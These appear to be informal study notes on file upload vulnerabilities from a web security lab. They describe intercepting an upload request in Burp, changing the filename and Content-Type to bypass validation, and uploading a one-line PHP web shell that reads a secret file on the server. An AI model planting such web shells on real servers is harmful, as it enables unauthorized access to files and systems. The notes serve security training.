
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size



### Flawed file type validation
When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is the preferred approach.

## Web shell upload via Content-Type restriction bypass


in this lab we capture the request by burp and change the Content-Disposition and change the file name and  in the content type we change the photo and upload the shell link

~~~
<?php echo file_get_contents('/home/carlos/secret'); ?>
~~~


![[Screenshot (70).png]]

in this get  request after the upload the payload and change the file name we the in the post request 

![[Screenshot (71).png]]


